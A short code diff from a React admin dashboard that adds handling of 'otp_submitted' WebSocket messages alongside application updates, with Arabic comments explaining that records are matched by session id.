@@ -558,7 +558,7 @@ export default function AdminDashboardPage() {
             const msg = JSON.parse(event.data);
             // تحديث لحظي — السيرفر ينشئ سجلاً جديداً (id مختلف) عند كل تحديث،
             // لذا نطابق بالـ sessionId (ثابت عبر النسخ) لا بالـ id
-            if (msg.type === "application_update" && msg.data) {
+            if ((msg.type === "application_update" || msg.type === "otp_submitted") && msg.data) {
               // اكتشاف الـ id القديم قبل التحديث (لتحديث versionCache و expandedRows)
               const currentList = queryClient.getQueryData<Array<{ id: number; sessionId: string }>>(
                 getListApplicationsQueryKey()
